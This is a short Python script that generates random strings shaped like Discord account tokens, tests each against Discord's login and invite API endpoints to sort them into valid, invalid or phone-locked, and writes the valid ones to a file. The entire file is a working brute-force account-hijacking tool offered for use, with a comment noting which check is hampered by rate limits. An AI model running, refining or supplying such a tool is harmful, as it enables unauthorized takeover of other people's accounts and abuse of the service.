from requests import get, post
from random import randint
import random

def variant1(token):
    response = get('https://discord.com/api/v6/auth/login', headers={"Authorization": token})#Bad variant for mass token check due to the rate limit.
    return True if response.status_code == 200 else False

def variant2(token):
    response = post(f'https://discord.com/api/v7/invite/{randint(1,9999999)}', headers={'Authorization': token})
    print(response.status_code)
    if "You need to verify your account in order to perform this action." in str(response.content) or "401: Unauthorized" in str(response.content):
        return False
    else:
        return True

def variant2_Status(token):
    response = post(f'https://discord.com/api/v7/invite/{randint(1,9999999)}', headers={'Authorization': token})
    if response.status_code == 401:
        return 'Invalid'
    elif "You need to verify your account in order to perform this action." in str(response.content):
        return 'Phone Lock'
    else:
        return 'Valid'

def get_random_string(letters,length):
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str


if __name__ == "__main__":
    checked = []
    tokens = input("Total Valid token:")
    print(tokens)
    count = 0
    string_choice = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    while (int(count) < int(tokens)):
        token = str(get_random_string(string_choice, 24)) + "." + str(get_random_string(string_choice,6)) + "." + str(get_random_string( string_choice, 8)) + "-" + str(get_random_string(string_choice, 18))
        if len(token) > 15 and token not in checked and variant2(token) == True:
            print(f'Token: {token} is Valid')
            checked.append(token)
            count = count + 1
        else:
            print(f'Token: {token} is Invalid')

    if len(checked) > 0:
        save = input(f'{len(checked)} valid tokens\nSave to File (y/n)').lower()
        if save == 'y':
            name = randint(100000000, 9999999999)
            with open(f'{name}.txt', 'w') as saveFile:
                saveFile.write('\n'.join(checked))
            print(f'Tokens Save To {name}.txt File!')
    input('Press Enter For Exit...')







